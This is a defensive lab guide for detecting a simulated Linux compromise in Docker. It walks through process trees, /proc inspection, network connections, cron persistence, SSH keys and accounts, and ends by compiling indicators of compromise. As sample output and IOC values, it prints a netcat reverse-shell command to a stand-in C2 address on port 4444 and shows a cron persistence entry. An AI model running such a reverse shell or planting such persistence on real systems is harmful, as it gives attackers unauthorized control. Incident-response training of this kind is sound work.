# Demo 03: Process Analysis and Suspicious Activity Detection

**Estimated time:** 35 minutes

---

## Overview

A compromised Linux system inside Docker has a pre-installed "malicious" process that mimics real attacker behavior: a reverse shell simulation, cron-based persistence, and unusual network connections.
You will use standard OS tools to detect and document the attacker's footprint.

---

## Learning Objectives

* Use process analysis tools to identify suspicious processes
* Detect suspicious network connections tied to process IDs
* Find persistence mechanisms left by a simulated attacker
* Interpret process trees to identify unusual parent-child relationships

---

## Prerequisites

* Docker installed and running

---

## Setup

```console
cd demos/demo-03-process-analysis
docker compose up --build
docker compose exec investigation bash
```

The container starts with a simulated "malware" process, an unusual cron job, and a suspicious network connection already running.

---

## Step 1: Review the Running Process Tree

```console
ps auxf
```

Look for output like this (your PIDs will differ):

```text
root  142  0.0  0.1  python3 /tmp/.hidden/updater.py
         └── root 143  nc -e /bin/bash 10.10.10.5 4444
```

**Key observations:**

* Process running from `/tmp/.hidden/` — suspicious path
* `nc -e` (netcat with `-e`) is a classic reverse shell indicator
* A Python dropper spawned a child netcat process

---

## Step 2: Investigate the Suspicious Process

```bash
# Replace 142 with the actual PID you found
PID=142

# Get the full command line
cat /proc/$PID/cmdline | tr '\0' ' '

# Check if the executable has been deleted from disk (common malware technique)
ls -la /proc/$PID/exe

# Get open file descriptors
ls -la /proc/$PID/fd

# Get the working directory
ls -la /proc/$PID/cwd
```

If `ls -la /proc/$PID/exe` contains `(deleted)`, the binary was deleted after execution — a common anti-forensics technique.
The file can still be recovered from `/proc/$PID/exe`.

---

## Step 3: Analyze Network Connections

```bash
# Show all established connections with process info
ss -tnp

# Look for:
# ESTAB  0  0  10.0.0.5:XXXXX  10.10.10.5:4444  users:(("nc",pid=143,fd=3))
# ^^^ outbound to a port like 4444 from netcat = reverse shell

# Check for unusual listening ports (C2 backdoors)
ss -tlnp
# Any listener on ports like :4444, :31337, :1234 is suspicious

# Resolve suspicious remote IPs
host 10.10.10.5 2>/dev/null || echo "No DNS - possibly malicious C2"
```

---

## Step 4: Find Persistence Mechanisms

```bash
# Check cron jobs for all users
for user in $(cut -d: -f1 /etc/passwd); do
  CRON=$(crontab -l -u $user 2>/dev/null)
  if [ -n "$CRON" ]; then
    echo "=== Cron for $user ==="
    echo "$CRON"
  fi
done

# Check system cron directories
cat /etc/crontab
ls -la /etc/cron.d/
for f in /etc/cron.d/*; do echo "=== $f ==="; cat $f; done

# Find recently modified files in /tmp
find /tmp -ls 2>/dev/null

# Find hidden directories (starting with .)
find / -name ".*" -type d \
  -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

A suspicious cron entry looks like:

```text
* * * * *  root  /tmp/.hidden/updater.py
```

---

## Step 5: Check SSH Authorized Keys

```console
# Find and review all authorized_keys files
find /home /root -name "authorized_keys" \
  -exec echo "=== {} ===" \; -exec cat {} \;
```

Any key you do not recognize should be treated as an unauthorized backdoor access key.

---

## Step 6: Check for Recently Created Accounts

```console
# Check the last few entries in /etc/passwd
tail -5 /etc/passwd

# Find accounts with interactive shells (not /nologin or /false)
awk -F: '{print $1, $3, $6, $7}' /etc/passwd | \
  grep -v "/nologin\|/false"

# Find any account with UID 0 (root-level)
awk -F: '($3 == 0) {print $1, "has UID 0!"}' /etc/passwd
```

---

## Step 7: Compile Your IOCs

Document the indicators of compromise you found:

| IOC Type | Value | Significance |
|----------|-------|-------------|
| Process | `/tmp/.hidden/updater.py` | Dropper running from temp directory |
| Process | `nc -e /bin/bash 10.10.10.5 4444` | Active reverse shell |
| Network | `10.10.10.5:4444` | C2 server address |
| Persistence | Cron job from `/tmp/.hidden/` | Survives process kill |
| (if found) SSH key | `ssh-rsa AAAA...attacker@evil.com` | Backdoor access |

---

## Discussion Points

1. **`/tmp` is never legitimate**: Legitimate software does not run from `/tmp`, `/dev/shm`, or other temp directories. These paths are instant red flags.

1. **`nc -e` = reverse shell**: The `-e` flag connects a program's stdio to the network socket. Any process doing this should be immediately terminated.

1. **Deleted executables**: Malware deletes its file after execution to hinder forensics. The process keeps running because the kernel holds the file descriptor open. Recover via `/proc/<PID>/exe`.

1. **Cron persistence**: Simple, reliable, survives reboots. Reviewing all cron jobs should be a standard part of every incident investigation.

---

## Clean Up

```console
docker compose down
```
